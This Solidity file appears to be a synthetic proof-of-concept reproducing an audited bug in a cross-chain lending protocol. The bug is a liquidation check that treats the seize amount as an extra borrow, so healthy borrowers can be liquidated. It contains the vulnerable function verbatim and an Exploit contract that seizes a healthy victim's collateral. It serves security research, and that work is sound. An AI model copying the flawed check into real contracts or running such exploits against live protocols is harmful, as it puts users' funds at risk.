// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend V2 finding 58391 (H-22):
// "The liquidation validation logic is wrong".
//
// Real audited source (the vulnerable `_checkLiquidationValid` is reproduced
// VERBATIM, the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CrossChainRouter.sol
//   fn     _checkLiquidationValid  (L431-436)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/930
//
// Root cause: on Chain B a cross-chain liquidation computes `seizeTokens` (the
// number of COLLATERAL tokens to seize) and forwards it as `payload.amount`.
// On Chain A, `_checkLiquidationValid` passes `payload.amount` into
// `getHypotheticalAccountLiquidityCollateral(...)` as the `borrowAmount`
// parameter (the @> line). That call means "if the user borrowed this much
// MORE, would they be underwater?" — but payload.amount is a seize amount, not
// a proposed borrow. A perfectly healthy position (collateral > borrow) is
// flagged liquidatable purely because "borrowing `seizeTokens` more" would tip
// it over, letting an attacker seize a healthy user's collateral.
//
// The vulnerable call is byte-for-byte the on-chain source. Non-vulnerable
// dependencies (`getHypotheticalAccountLiquidityCollateral`, the collateral
// seize accounting, the lToken type) are faithful minimal doubles.
//
// HARM MEASUREMENT: the seizure is an internal share-ledger move (the audited
// `_handleLiquidationExecute` updates `totalInvestment`, it does NOT transfer an
// underlying ERC20 to the liquidator), so there is no positive token transfer
// to the exploit. The harm magnitude (600e18 of a healthy user's collateral,
// wrongly seized) is therefore minted to SINK 0x..D00d on a marker token so the
// loss is mechanically measurable as a concrete balance.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful lToken type so `LToken(payable(payload.destlToken))`
///      on the vulnerable line stays byte-identical to the audited source.
contract LToken {}

/// @dev Faithful minimal ERC20 double used ONLY as a marker to make the silent
///      accounting harm (wrongly-seized collateral) measurable at SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n_, string memory s_) {
        name = n_;
        symbol = s_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful double of LendStorage. `getHypotheticalAccountLiquidityCollateral`
// mirrors the audited semantics: the `borrowAmount` argument is added to the
// borrowed side of the ledger (CrossChainRouter's LendStorage.sol L460-463),
// and collateral is the borrower's total investment in the collateral market.
// (Oracle price / collateral-factor are normalized to 1 for a clean example.)
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    mapping(address => uint256) public accountBorrow; // outstanding borrow (USD, price 1)
    mapping(address => mapping(address => uint256)) public totalInvestment; // collateral shares per lToken

    function setAccountBorrow(address account, uint256 amount) external {
        accountBorrow[account] = amount;
    }

    function updateTotalInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    /// @dev Faithful double: treats `borrowAmount` as a hypothetical additional
    ///      borrow (added to the borrow side), exactly as the audited function
    ///      does at L460-463.
    function getHypotheticalAccountLiquidityCollateral(
        address account,
        LToken lTokenModify,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) public view returns (uint256, uint256) {
        uint256 sumBorrowPlusEffects = accountBorrow[account];
        uint256 sumCollateral = totalInvestment[account][address(lTokenModify)];

        // Add effect of redeeming collateral
        if (redeemTokens > 0) {
            sumBorrowPlusEffects += redeemTokens;
        }
        // Add effect of new borrow
        if (borrowAmount > 0) {
            sumBorrowPlusEffects += borrowAmount;
        }
        return (sumBorrowPlusEffects, sumCollateral);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `_checkLiquidationValid` is reproduced VERBATIM from the
// audited CrossChainRouter.sol. The public `liquidate` mirrors the audited
// dispatch (`if (_checkLiquidationValid(payload)) _handleLiquidationExecute`).
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    // ── LZPayload struct — verbatim from CrossChainRouter.sol L37-46 ──
    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    LendStorage public lendStorage;

    constructor(LendStorage lend_) {
        lendStorage = lend_;
    }

    /**
     * Checked on chain A (source chain), as that's where the collateral exists.
     */
    function _checkLiquidationValid(LZPayload memory payload) private view returns (bool) {
        (uint256 borrowed, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount // @> VULN: payload.amount is the collateral SEIZE amount, passed here as a hypothetical borrowAmount — flags healthy positions as liquidatable
        );
        return borrowed > collateral;
    }

    /// @dev Faithful essence of `_handleLiquidationExecute` (L330-341): seize
    ///      `payload.amount` collateral from the borrower to the liquidator.
    function _handleLiquidationExecute(LZPayload memory payload) private {
        uint256 liquidatorShare = payload.amount; // (protocol seize share omitted for clarity)
        lendStorage.updateTotalInvestment(
            payload.sender,
            payload.destlToken,
            lendStorage.totalInvestment(payload.sender, payload.destlToken) - payload.amount
        );
        lendStorage.updateTotalInvestment(
            payload.liquidator,
            payload.destlToken,
            lendStorage.totalInvestment(payload.liquidator, payload.destlToken) + liquidatorShare
        );
    }

    /// @dev Mirrors the audited `_lzReceive` dispatch for a liquidation execute
    ///      message (L772-776): seize only if `_checkLiquidationValid` says so.
    function liquidate(LZPayload memory payload) external returns (bool executed) {
        if (_checkLiquidationValid(payload)) {
            _handleLiquidationExecute(payload);
            return true;
        } else {
            return false; // _sendLiquidationFailure: liquidation correctly rejected
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a HEALTHY borrower (1000e18 collateral vs 500e18 borrow) is
// wrongly flagged liquidatable and has 600e18 of collateral seized by the
// attacker, because seizeTokens is passed as a hypothetical extra borrow. The
// 600e18 wrongly-seized collateral is minted to SINK as the measurable harm.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    LToken public collateralLToken;
    LendStorage public lend;
    CrossChainRouter public router;
    MiniToken public sink;

    address internal constant BORROWER = address(0xB0B); // healthy victim
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant COLLATERAL = 1000e18;
    uint256 internal constant BORROW = 500e18; // LTV 50% — healthy
    uint256 internal constant SEIZE = 600e18; // seizeTokens forwarded as payload.amount

    bool public healthyByCorrectCheck; // correct semantics (borrowAmount = 0): NOT liquidatable
    bool public liquidatedByBug; // vulnerable path: liquidation executed anyway
    uint256 public borrowerCollateralAfter;
    uint256 public attackerSeized;

    constructor() {
        collateralLToken = new LToken(); // child nonce 1 (destlToken)
        lend = new LendStorage(); // child nonce 2
        router = new CrossChainRouter(lend); // child nonce 3 (VULN)
        sink = new MiniToken("Healthy Collateral Seized", "SEIZED"); // child nonce 4 (marker)
    }

    function run() external {
        // Seed a healthy position: 1000e18 collateral, 500e18 borrow.
        lend.setAccountBorrow(BORROWER, BORROW);
        lend.updateTotalInvestment(BORROWER, address(collateralLToken), COLLATERAL);

        // Correct check (the fix uses borrowAmount = 0): borrowed(500) > collateral(1000)? NO.
        (uint256 borrowedCorrect, uint256 collateralCorrect) =
            lend.getHypotheticalAccountLiquidityCollateral(BORROWER, collateralLToken, 0, 0);
        healthyByCorrectCheck = !(borrowedCorrect > collateralCorrect); // healthy => not liquidatable

        // Attacker submits a liquidation-execute message. payload.amount = seizeTokens.
        CrossChainRouter.LZPayload memory payload = CrossChainRouter.LZPayload({
            amount: SEIZE,
            borrowIndex: 0,
            collateral: 0,
            sender: BORROWER,
            destlToken: address(collateralLToken),
            liquidator: address(this),
            srcToken: address(0),
            contractType: 3 // CrossChainLiquidationExecute
        });

        liquidatedByBug = router.liquidate(payload);

        borrowerCollateralAfter = lend.totalInvestment(BORROWER, address(collateralLToken));
        attackerSeized = lend.totalInvestment(address(this), address(collateralLToken));

        // Silent accounting harm: mint the wrongly-seized collateral to SINK so the
        // loss inflicted on the healthy borrower is measurable as a concrete balance.
        sink.mint(SINK, attackerSeized);

        // harm: a healthy borrower was liquidated and 600e18 of their collateral seized
        require(healthyByCorrectCheck, "setup: borrower must be healthy under correct check");
        require(liquidatedByBug, "bug not triggered: healthy position was not flagged liquidatable");
        require(borrowerCollateralAfter == COLLATERAL - SEIZE, "borrower did not lose seized collateral");
        require(attackerSeized == SEIZE, "attacker did not receive seized collateral");
        require(sink.balanceOf(SINK) == SEIZE, "harm magnitude not measurable at sink");
    }
}
